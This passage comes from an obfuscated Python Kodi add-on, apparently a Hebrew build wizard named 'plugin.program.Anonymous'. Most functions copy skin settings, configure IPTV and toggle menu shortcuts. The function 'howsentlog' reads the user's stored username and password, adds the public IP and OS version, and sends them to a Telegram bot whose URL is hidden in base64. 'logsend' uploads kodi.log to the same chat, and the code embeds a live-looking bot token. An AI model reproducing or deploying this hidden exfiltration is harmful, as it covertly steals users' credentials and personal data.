            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')#line:817
    with open (OOO0O00OO00OOO0OO ,'w')as O0OO0O0O0O0OO00OO :#line:820
      O0OO0O0O0O0OO00OO .write (OOO0OOO00000O000O )#line:821
    OO00OOO0O00OO0O0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")#line:822
    O0OO00OOO0OO00000 =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:823
    copyfile (OO00OOO0O00OO0O0O ,O0OO00OOO0OO00000 )#line:825
def testcommand ():#line:826
	O00000O000O0O000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")#line:827
	OOOOOOO00OOO00000 =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:828
	copyfile (O00000O000O0O000O ,OOOOOOO00OOO00000 )#line:830
def autotrakt ():#line:835
    O000000OO000O0000 =(ADDON .getSetting ("auto_trk"))#line:836
    if O000000OO000O0000 =='true':#line:837
       from resources .libs import trk_aut #line:838
def traktsync ():#line:840
     O0O00OO00OOO0OO0O =(ADDON .getSetting ("auto_trk"))#line:841
     if O0O00OO00OOO0OO0O =='true':#line:842
       from resources .libs import trk_aut #line:845
     else :#line:846
        ADDON .openSettings ()#line:847
def imdb_synck ():#line:849
   try :#line:850
     OO00O000OO0OO0000 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:851
     O00000O00OOOO000O =xbmcaddon .Addon ('plugin.video.gaia')#line:852
     OOO0O0OOOO00OOOOO =(ADDON .getSetting ("imdb_sync"))#line:853
     OO0O0O00O00O0O0O0 ="imdb.user"#line:854
     O00OOOO00000000O0 ="accounts.informants.imdb.user"#line:855
     OO00O000OO0OO0000 .setSetting (OO0O0O00O00O0O0O0 ,str (OOO0O0OOOO00OOOOO ))#line:856
     O00000O00OOOO000O .setSetting ('accounts.informants.imdb.enabled','true')#line:857
     O00000O00OOOO000O .setSetting (O00OOOO00000000O0 ,str (OOO0O0OOOO00OOOOO ))#line:858
   except :pass #line:859
def dis_or_enable_addon (OOO00OO0OO00O0O00 ,OOOO000OO0O00OOO0 ,enable ="true"):#line:861
    import json #line:862
    OO0OO00000O0OOO00 ='"%s"'%OOO00OO0OO00O0O00 #line:863
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO00OO0OO00O0O00 )and enable =="true":#line:864
        logging .warning ('already Enabled')#line:865
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO00OO0OO00O0O00 )#line:866
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO00OO0OO00O0O00 )and enable =="false":#line:867
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO00OO0OO00O0O00 )#line:868
    else :#line:869
        OO0OOOOOO000O0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0OO00000O0OOO00 ,enable )#line:870
        OOOOO00OO0000OO00 =xbmc .executeJSONRPC (OO0OOOOOO000O0O0O )#line:871
        O0O00O0O00OOO0O0O =json .loads (OOOOO00OO0000OO00 )#line:872
        if enable =="true":#line:873
            xbmc .log ("### Enabled %s, response = %s"%(OOO00OO0OO00O0O00 ,O0O00O0O00OOO0O0O ))#line:874
        else :#line:875
            xbmc .log ("### Disabled %s, response = %s"%(OOO00OO0OO00O0O00 ,O0O00O0O00OOO0O0O ))#line:876
    if OOOO000OO0O00OOO0 =='auto':#line:877
     return True #line:878
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:879
def iptvset ():#line:882
  try :#line:883
    O0O0000000O0O0O0O =(ADDON .getSetting ("iptv_on"))#line:884
    if O0O0000000O0O0O0O =='true':#line:886
       if KODIV >=17 and KODIV <18 :#line:888
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:889
         O0000OO00O0OO000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:890
         O000OOO0O00OOO000 =(ADDON .getSetting ("iptvUrl"))#line:892
         O0000OO00O0OO000O .setSetting ('m3uUrl',O000OOO0O00OOO000 )#line:893
         O00O000OOOO0000OO =(ADDON .getSetting ("epg_Url"))#line:894
         O0000OO00O0OO000O .setSetting ('epgUrl',O00O000OOOO0000OO )#line:895
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:898
         iptvsimpldownpc ()#line:899
         wiz .kodi17Fix ()#line:900
         xbmc .sleep (1000 )#line:901
         O0000OO00O0OO000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:902
         O000OOO0O00OOO000 =(ADDON .getSetting ("iptvUrl"))#line:903
         O0000OO00O0OO000O .setSetting ('m3uUrl',O000OOO0O00OOO000 )#line:904
         O00O000OOOO0000OO =(ADDON .getSetting ("epg_Url"))#line:905
         O0000OO00O0OO000O .setSetting ('epgUrl',O00O000OOOO0000OO )#line:906
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:908
         iptvsimpldown ()#line:909
         wiz .kodi17Fix ()#line:910
         xbmc .sleep (1000 )#line:911
         O0000OO00O0OO000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:912
         O000OOO0O00OOO000 =(ADDON .getSetting ("iptvUrl"))#line:913
         O0000OO00O0OO000O .setSetting ('m3uUrl',O000OOO0O00OOO000 )#line:914
         O00O000OOOO0000OO =(ADDON .getSetting ("epg_Url"))#line:915
         O0000OO00O0OO000O .setSetting ('epgUrl',O00O000OOOO0000OO )#line:916
  except :pass #line:917
def howsentlog ():#line:924
       try :#line:926
          import json #line:927
          OOOO00O0O0O000OOO =(ADDON .getSetting ("user"))#line:928
          O0O000O00000OO0O0 =(ADDON .getSetting ("pass"))#line:929
          OO00OOO0OO000O00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:930
          OO000OOOOOOOO000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:932
          O000000OOO0OOOOOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:933
          OOOO0000000OOOOO0 =str (json .loads (O000000OOO0OOOOOO )['ip'])#line:934
          OO0O0O0O0O000OOOO =OOOO00O0O0O000OOO #line:935
          O0000OOOO00O0O0OO =O0O000O00000OO0O0 #line:936
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:937
          xbmc .sleep (1500 )#line:938
          O00OOO0OO0O0O0O00 =xbmc .getInfoLabel ('System.OSVersionInfo')#line:939
          import socket #line:941
          O000000OOO0OOOOOO =urllib2 .urlopen (OO000OOOOOOOO000O .decode ('base64')+' מערכת הפעלה: '+O00OOO0OO0O0O0O00 +' שם משתמש: '+OO0O0O0O0O000OOOO +' סיסמה: '+O0000OOOO00O0O0OO +' קודי: '+OO00OOO0OO000O00O +' כתובת: '+OOOO0000000OOOOO0 ).readlines ()#line:942
       except :pass #line:944
def googleindicat ():#line:947
			import logg #line:948
			O0O0OOOOOO000000O =(ADDON .getSetting ("pass"))#line:949
			O0OO0OO0000OOOO00 =(ADDON .getSetting ("user"))#line:950
			logg .logGA (O0O0OOOOOO000000O ,O0OO0OO0000OOOO00 )#line:951
def logsend ():#line:952
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:953
      OO0OOO000O00O0O00 =xbmcgui .DialogBusy ()#line:954
      OO0OOO000O00O0O00 .create ()#line:955
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:956
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:957
      howsentlog ()#line:959
      import requests #line:960
      if xbmc .getCondVisibility ('system.platform.windows'):#line:961
         O0O0O00O0OOO00O00 =xbmc .translatePath ('special://home/kodi.log')#line:962
         OO0O0O0O0OOO0OOO0 ={'chat_id':(None ,'-274262389'),'document':(O0O0O00O0OOO00O00 ,open (O0O0O00O0OOO00O00 ,'rb')),}#line:966
         OO000OO0O0O0O0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:967
         O000O00O0000OO00O =requests .post (OO000OO0O0O0O0OO0 .decode ('base64'),files =OO0O0O0O0OOO0OOO0 )#line:969
      elif xbmc .getCondVisibility ('system.platform.android'):#line:970
           O0O0O00O0OOO00O00 =xbmc .translatePath ('special://temp/kodi.log')#line:971
           OO0O0O0O0OOO0OOO0 ={'chat_id':(None ,'-274262389'),'document':(O0O0O00O0OOO00O00 ,open (O0O0O00O0OOO00O00 ,'rb')),}#line:975
           OO000OO0O0O0O0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:976
           O000O00O0000OO00O =requests .post (OO000OO0O0O0O0OO0 .decode ('base64'),files =OO0O0O0O0OOO0OOO0 )#line:978
      else :#line:979
           O0O0O00O0OOO00O00 =xbmc .translatePath ('special://kodi.log')#line:980
           OO0O0O0O0OOO0OOO0 ={'chat_id':(None ,'-274262389'),'document':(O0O0O00O0OOO00O00 ,open (O0O0O00O0OOO00O00 ,'rb')),}#line:984
           OO000OO0O0O0O0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:985
           O000O00O0000OO00O =requests .post (OO000OO0O0O0O0OO0 .decode ('base64'),files =OO0O0O0O0OOO0OOO0 )#line:987
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:988
def rdoff ():#line:990
	OOO0OO00O00O0OOOO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:1021
	OOO0O000OO0OOO000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1022
	copyfile (OOO0OO00O00O0OOOO ,OOO0O000OO0OOO000 )#line:1023
def skindialogsettind18 ():#line:1024
	try :#line:1025
		O0O0OO00O000OO000 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:1026
		OO000000O0O000OOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:1027
		copyfile (O0O0OO00O000OO000 ,OO000000O0O000OOO )#line:1028
	except :pass #line:1029
def rdon ():#line:1030
	loginit .loginIt ('restore','all')#line:1031
	O00OOOO0O0000O0OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1033
	O00OOOO0OOOOOOOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1034
	copyfile (O00OOOO0O0000O0OO ,O00OOOO0OOOOOOOO0 )#line:1035
def adults18 ():#line:1037
  OOOO000O000OO0O0O =(ADDON .getSetting ("adults"))#line:1038
  if OOOO000O000OO0O0O =='true':#line:1039
    O0O00O0OOOO000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1040
    with open (O0O00O0OOOO000000 ,'r')as O00OOOO00OO0000OO :#line:1041
      O0OO000OOOOOOO00O =O00OOOO00OO0000OO .read ()#line:1042
    O0OO000OOOOOOO00O =O0OO000OOOOOOO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1060
    with open (O0O00O0OOOO000000 ,'w')as O00OOOO00OO0000OO :#line:1063
      O00OOOO00OO0000OO .write (O0OO000OOOOOOO00O )#line:1064
def rdbuildaddon ():#line:1065
  OO000000OO0O0O000 =(ADDON .getSetting ("auto_rd"))#line:1066
  if OO000000OO0O0O000 =='true':#line:1067
    O000O0O000OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1068
    with open (O000O0O000OO0OOOO ,'r')as O00OO000OOO0O000O :#line:1069
      OO0O00000000OOO00 =O00OO000OOO0O000O .read ()#line:1070
    OO0O00000000OOO00 =OO0O00000000OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1088
    with open (O000O0O000OO0OOOO ,'w')as O00OO000OOO0O000O :#line:1091
      O00OO000OOO0O000O .write (OO0O00000000OOO00 )#line:1092
    O000O0O000OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1096
    with open (O000O0O000OO0OOOO ,'r')as O00OO000OOO0O000O :#line:1097
      OO0O00000000OOO00 =O00OO000OOO0O000O .read ()#line:1098
    OO0O00000000OOO00 =OO0O00000000OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1116
    with open (O000O0O000OO0OOOO ,'w')as O00OO000OOO0O000O :#line:1119
      O00OO000OOO0O000O .write (OO0O00000000OOO00 )#line:1120
    O000O0O000OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1124
    with open (O000O0O000OO0OOOO ,'r')as O00OO000OOO0O000O :#line:1125
      OO0O00000000OOO00 =O00OO000OOO0O000O .read ()#line:1126
    OO0O00000000OOO00 =OO0O00000000OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1144
    with open (O000O0O000OO0OOOO ,'w')as O00OO000OOO0O000O :#line:1147
      O00OO000OOO0O000O .write (OO0O00000000OOO00 )#line:1148
    O000O0O000OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1152
    with open (O000O0O000OO0OOOO ,'r')as O00OO000OOO0O000O :#line:1153
      OO0O00000000OOO00 =O00OO000OOO0O000O .read ()#line:1154
    OO0O00000000OOO00 =OO0O00000000OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1172
    with open (O000O0O000OO0OOOO ,'w')as O00OO000OOO0O000O :#line:1175
      O00OO000OOO0O000O .write (OO0O00000000OOO00 )#line:1176
    O000O0O000OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1179
    with open (O000O0O000OO0OOOO ,'r')as O00OO000OOO0O000O :#line:1180
      OO0O00000000OOO00 =O00OO000OOO0O000O .read ()#line:1181
    OO0O00000000OOO00 =OO0O00000000OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1199
    with open (O000O0O000OO0OOOO ,'w')as O00OO000OOO0O000O :#line:1202
      O00OO000OOO0O000O .write (OO0O00000000OOO00 )#line:1203
    O000O0O000OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1205
    with open (O000O0O000OO0OOOO ,'r')as O00OO000OOO0O000O :#line:1206
      OO0O00000000OOO00 =O00OO000OOO0O000O .read ()#line:1207
    OO0O00000000OOO00 =OO0O00000000OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1225
    with open (O000O0O000OO0OOOO ,'w')as O00OO000OOO0O000O :#line:1228
      O00OO000OOO0O000O .write (OO0O00000000OOO00 )#line:1229
    O000O0O000OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1231
    with open (O000O0O000OO0OOOO ,'r')as O00OO000OOO0O000O :#line:1232
      OO0O00000000OOO00 =O00OO000OOO0O000O .read ()#line:1233
    OO0O00000000OOO00 =OO0O00000000OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1251
    with open (O000O0O000OO0OOOO ,'w')as O00OO000OOO0O000O :#line:1254
      O00OO000OOO0O000O .write (OO0O00000000OOO00 )#line:1255
    O000O0O000OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1258
    with open (O000O0O000OO0OOOO ,'r')as O00OO000OOO0O000O :#line:1259
      OO0O00000000OOO00 =O00OO000OOO0O000O .read ()#line:1260
    OO0O00000000OOO00 =OO0O00000000OOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1278
    with open (O000O0O000OO0OOOO ,'w')as O00OO000OOO0O000O :#line:1281
      O00OO000OOO0O000O .write (OO0O00000000OOO00 )#line:1282
def rdbuildinstall ():#line:1285
  try :#line:1286
   O0OOOO0000OOO00O0 =(ADDON .getSetting ("auto_rd"))#line:1287
   if O0OOOO0000OOO00O0 =='true':#line:1288
     OO0OOOOOO00O0O0OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1289
     O0OOOO0OO00OOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1290
     copyfile (OO0OOOOOO00O0O0OO ,O0OOOO0OO00OOO00O )#line:1291
  except :#line:1292
     pass #line:1293
def rdbuildaddonoff ():#line:1296
    O0O0O0OO000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1299
    with open (O0O0O0OO000OOOO0O ,'r')as O00000O0O00O0OO00 :#line:1300
      OO00O000OOOOOOO00 =O00000O0O00O0OO00 .read ()#line:1301
    OO00O000OOOOOOO00 =OO00O000OOOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1319
    with open (O0O0O0OO000OOOO0O ,'w')as O00000O0O00O0OO00 :#line:1322
      O00000O0O00O0OO00 .write (OO00O000OOOOOOO00 )#line:1323
    O0O0O0OO000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1327
    with open (O0O0O0OO000OOOO0O ,'r')as O00000O0O00O0OO00 :#line:1328
      OO00O000OOOOOOO00 =O00000O0O00O0OO00 .read ()#line:1329
    OO00O000OOOOOOO00 =OO00O000OOOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1347
    with open (O0O0O0OO000OOOO0O ,'w')as O00000O0O00O0OO00 :#line:1350
      O00000O0O00O0OO00 .write (OO00O000OOOOOOO00 )#line:1351
    O0O0O0OO000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1355
    with open (O0O0O0OO000OOOO0O ,'r')as O00000O0O00O0OO00 :#line:1356
      OO00O000OOOOOOO00 =O00000O0O00O0OO00 .read ()#line:1357
    OO00O000OOOOOOO00 =OO00O000OOOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
